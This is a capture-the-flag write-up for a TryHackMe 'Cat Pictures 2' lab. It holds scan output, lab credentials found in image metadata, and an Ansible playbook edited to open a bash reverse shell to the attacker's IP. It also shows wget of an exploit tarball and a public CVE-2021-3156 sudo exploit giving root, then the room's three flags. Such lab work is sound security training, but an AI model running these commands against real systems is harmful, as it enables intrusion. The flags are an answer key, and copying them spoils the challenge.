----
Now with more Cat Pictures!
----

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/4c424fa649d64938ae8282b14e4299ac.png)


### Task 2  Flags!

Give me the flags!

Answer the questions below

```
                                
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.183.200 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.183.200:22
Open 10.10.183.200:80
Open 10.10.183.200:3000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 19:21 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:21
Completed NSE at 19:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:21
Completed NSE at 19:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:21
Completed NSE at 19:21, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:21
Completed Parallel DNS resolution of 1 host. at 19:21, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:21
Scanning 10.10.183.200 [3 ports]
Discovered open port 22/tcp on 10.10.183.200
Discovered open port 80/tcp on 10.10.183.200
Discovered open port 3000/tcp on 10.10.183.200
Completed Connect Scan at 19:21, 0.19s elapsed (3 total ports)
Initiating Service scan at 19:21
Scanning 3 services on 10.10.183.200
Completed Service scan at 19:22, 94.21s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.183.200.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:22
Completed NSE at 19:22, 6.21s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:22
Completed NSE at 19:22, 1.64s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:22
Completed NSE at 19:22, 0.00s elapsed
Nmap scan report for 10.10.183.200
Host is up, received user-set (0.19s latency).
Scanned at 2023-07-03 19:21:04 EDT for 103s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33f0033626368c2f88952cacc3bc6465 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWn7oP+xezi54hhxJR3FAOcCt9gU+ZfOXquxFX/NC6USigzwXcxw2B4P3Yz6Huhaox1WRRgOSAYPJp9uo1gnA+ttkVdRaIqmcizbsznuU6sXntwiunD/QDNegq5UwJI3PjQu05HhnTNwGlBuiv+V/HW2OZGo0LLMY8ixqphCtAbw5uQZsV28rB2Yy1C7FYjkRzfhGePOfyq8Ga4FSpRnWz1vHYyEzFiF9tyLXNcDEdIWalKA6hrr7msEneSITE/RrGt5tynn6Rq5/3Os0mdbV0ztvqavwcWRR6B1UAJ+zPR/GKJ6s4Zr8ImoAXIZc7lFQ7Oh8DVWYp4cearg90RZUx
|   256 4ff3b3f26e0391b27cc053d5d4038846 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFhoBFkSKYS/dRjYASX26cs3gtgKxnLhhnXBas1fJ5i32J7h9+X8XA3GHT2SzP8/CBbs759W5q68jDA9nsTYnzo=
|   256 137c478b6ff8f46b429af2d53d341352 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMiQc+7IBNNbs8nZJ4L+ntHTLbWn0Xn5b+QnWuboKE6r
80/tcp   open  http    syn-ack nginx 1.4.6 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 60D8216C0FDE4723DCA5FBD03AD44CB7
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.4.6 (Ubuntu)
| http-git: 
|   10.10.183.200:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|       https://github.com/electerious/Lychee.git
|_    Project type: PHP application (guessed from .gitignore)
|_http-title: Lychee
| http-robots.txt: 7 disallowed entries 
|_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
3000/tcp open  ppp?    syn-ack
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: no-store, no-transform
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=1ff0b17770725638; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=SPiXj75-c6sXHpC3TK1O-uEF2aQ6MTY4ODQyNjQ3Njk0MTMzNzIxMA; Path=/; Expires=Tue, 04 Jul 2023 23:21:16 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 03 Jul 2023 23:21:16 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title> Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Cache-Control: no-store, no-transform
|     Set-Cookie: i_like_gitea=49c924b2fa7c9667; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=yb5QvFTWvT08fivFTIxqy36Ox6Q6MTY4ODQyNjQ4Mjk4NzY5ODQ3MA; Path=/; Expires=Tue, 04 Jul 2023 23:21:22 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 03 Jul 2023 23:21:22 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.93%I=7%D=7/3%Time=64A357E7%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,2DE8,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:\
SF:x20no-store,\x20no-transform\r\nContent-Type:\x20text/html;\x20charset=
SF:UTF-8\r\nSet-Cookie:\x20i_like_gitea=1ff0b17770725638;\x20Path=/;\x20Ht
SF:tpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=SPiXj75-c6sXHpC3TK1O-uE
SF:F2aQ6MTY4ODQyNjQ3Njk0MTMzNzIxMA;\x20Path=/;\x20Expires=Tue,\x2004\x20Ju
SF:l\x202023\x2023:21:16\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cooki
SF:e:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly;\x20SameSite
SF:=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2003\x20Jul\x2
SF:02023\x2023:21:16\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-
SF:US\"\x20class=\"theme-\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<me
SF:ta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sca
SF:le=1\">\n\t<title>\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea</t
SF:itle>\n\t<link\x20rel=\"manifest\"\x20href=\"data:application/json;base
SF:64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUi
SF:OiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2x
SF:vY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi")%r(Help,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOpt
SF:ions,1C2,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nCache-Control
SF::\x20no-store,\x20no-transform\r\nSet-Cookie:\x20i_like_gitea=49c924b2f
SF:a7c9667;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csr
SF:f=yb5QvFTWvT08fivFTIxqy36Ox6Q6MTY4ODQyNjQ4Mjk4NzY5ODQ3MA;\x20Path=/;\x2
SF:0Expires=Tue,\x2004\x20Jul\x202023\x2023:21:22\x20GMT;\x20HttpOnly;\x20
SF:SameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;
SF:\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate
SF::\x20Mon,\x2003\x20Jul\x202023\x2023:21:22\x20GMT\r\nContent-Length:\x2
SF:00\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:22
Completed NSE at 19:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:22
Completed NSE at 19:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:22
Completed NSE at 19:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.90 seconds

http://10.10.183.200/robots.txt

User-agent: *
Disallow: /data/
Disallow: /dist/
Disallow: /docs/
Disallow: /php/
Disallow: /plugins/
Disallow: /src/
Disallow: /uploads/

http://10.10.183.200/#16678460194615/16678466730867

┌──(witty㉿kali)-[~]
└─$ exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg 
ExifTool Version Number         : 12.57
File Name                       : f5054e97620f168c7b5088c85ab1d6e4.jpg
Directory                       : .
File Size                       : 73 kB
File Modification Date/Time     : 2023:07:03 19:26:12-04:00
File Access Date/Time           : 2023:07:03 19:26:12-04:00
File Inode Change Date/Time     : 2023:07:03 19:26:13-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Profile CMM Type                : Little CMS
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2012:01:25 03:41:57
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : c2
Profile Copyright               : IX
Media White Point               : 0.9642 1 0.82491
Media Black Point               : 0.01205 0.0125 0.01031
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
XMP Toolkit                     : Image::ExifTool 12.49
Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
Image Width                     : 720
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 720x1080
Megapixels                      : 0.778

http://10.10.183.200:8080/764efa883dda1e11db47671c4a3bbd9e.txt

note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337

http://10.10.183.200:3000/samarium/ansible

10d916eaea54bb5ebe36b59538146bb5

http://10.10.183.200:1337/

Run Ansible Playbook

See Logs

Already up to date.

PLAY [Test] ********************************************************************

TASK [Gathering Facts] *********************************************************
ok: [127.0.0.1]

TASK [get the username running the deploy] *************************************
ok: [127.0.0.1]

TASK [debug] *******************************************************************
ok: [127.0.0.1] => {
    "username_on_the_host": {
        "changed": false, 
        "cmd": [
            "whoami"
        ], 
        "delta": "0:00:00.003904", 
        "end": "2023-07-03 16:32:35.895025", 
        "failed": false, 
        "rc": 0, 
        "start": "2023-07-03 16:32:35.891121", 
        "stderr": "", 
        "stderr_lines": [], 
        "stdout": "bismuth", 
        "stdout_lines": [
            "bismuth"
        ]
    }
}

TASK [Test] ********************************************************************
changed: [127.0.0.1]

PLAY RECAP *********************************************************************
127.0.0.1                  : ok=4    changed=1    unreachable=0    failed=0   

http://10.10.183.200:3000/samarium/ansible/src/branch/main/playbook.yaml

edit

---
- name: Test 
  hosts: all                                  # Define all the hosts
  remote_user: bismuth                                  
  # Defining the Ansible task
  tasks:             
    - name: get the username running the deploy
      become: false
      command: bash -c "bash -i >& /dev/tcp/10.8.19.103/4444 0>&1"
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: echo hi

and run playbook from ansible

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvp 4444                                       
listening on [any] 4444 ...
10.10.183.200: inverse host lookup failed: Unknown host
connect to [10.8.19.103] from (UNKNOWN) [10.10.183.200] 40868
bismuth@catpictures-ii:~$ which python
which python
/usr/bin/python
bismuth@catpictures-ii:~$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
bismuth@catpictures-ii:~$ cd /home
cd /home
bismuth@catpictures-ii:/home$ ls
ls
bismuth
bismuth@catpictures-ii:/home$ cd bismuth
cd bismuth
bismuth@catpictures-ii:~$ ls
ls
flag2.txt
bismuth@catpictures-ii:~$ cat flag2.txt
cat flag2.txt
5e2cafbbf180351702651c09cd797920

bismuth@catpictures-ii:/tmp$ cat /etc/*release
cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.6 LTS"
NAME="Ubuntu"
VERSION="18.04.6 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.6 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic


┌──(witty㉿kali)-[~/Downloads/blasty/CVE-2021-3156-main]
└─$ ls
brute.sh  lib.c     Makefile   sudo-hax-me-a-sandwich
hax.c     libnss_X  README.md

┌──(witty㉿kali)-[~/Downloads/blasty]
└─$ tar -cvf exploit.tar CVE-2021-3156-main
CVE-2021-3156-main/
CVE-2021-3156-main/libnss_X/
CVE-2021-3156-main/libnss_X/P0P_SH3LLZ_ .so.2
CVE-2021-3156-main/exploit.tar
CVE-2021-3156-main/sudo-hax-me-a-sandwich
CVE-2021-3156-main/README.md
CVE-2021-3156-main/lib.c
CVE-2021-3156-main/brute.sh
CVE-2021-3156-main/Makefile
CVE-2021-3156-main/hax.c
                                                                            
┌──(witty㉿kali)-[~/Downloads/blasty]
└─$ ls
CVE-2021-3156-main  exploit.tar

bismuth@catpictures-ii:/tmp$ wget http://10.8.19.103:1234/exploit.tar
wget http://10.8.19.103:1234/exploit.tar
--2023-07-03 16:45:21--  http://10.8.19.103:1234/exploit.tar
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 61440 (60K) [application/x-tar]
Saving to: ‘exploit.tar’

exploit.tar         100%[===================>]  60.00K   161KB/s    in 0.4s    

2023-07-03 16:45:22 (161 KB/s) - ‘exploit.tar’ saved [61440/61440]

┌──(witty㉿kali)-[~/Downloads/blasty]
└─$ python3 -m http.server 1234            
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.183.200 - - [03/Jul/2023 19:45:16] "GET /exploit.tar HTTP/1.1" 200 -

bismuth@catpictures-ii:/tmp$ tar xopf exploit.tar
tar xopf exploit.tar

bismuth@catpictures-ii:/tmp$ cd CVE-2021-3156-main
cd CVE-2021-3156-main
bismuth@catpictures-ii:/tmp/CVE-2021-3156-main$ make
make
rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
bismuth@catpictures-ii:/tmp/CVE-2021-3156-main$ ./sudo-hax-me-a-sandwich 0
./sudo-hax-me-a-sandwich 0

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **
[+] bl1ng bl1ng! We got it!
# cd /root
cd /root
# ls
ls
ansible  docker-compose.yaml  flag3.txt  gitea
# cat flag3.txt
cat flag3.txt
6d2a9f8f8174e86e27d565087a28a971



```

What is Flag 1?

*10d916eaea54bb5ebe36b59538146bb5*

What is Flag 2?

Ansible!

*5e2cafbbf180351702651c09cd797920*

What is Flag 3?

*6d2a9f8f8174e86e27d565087a28a971*


[[Theseus]]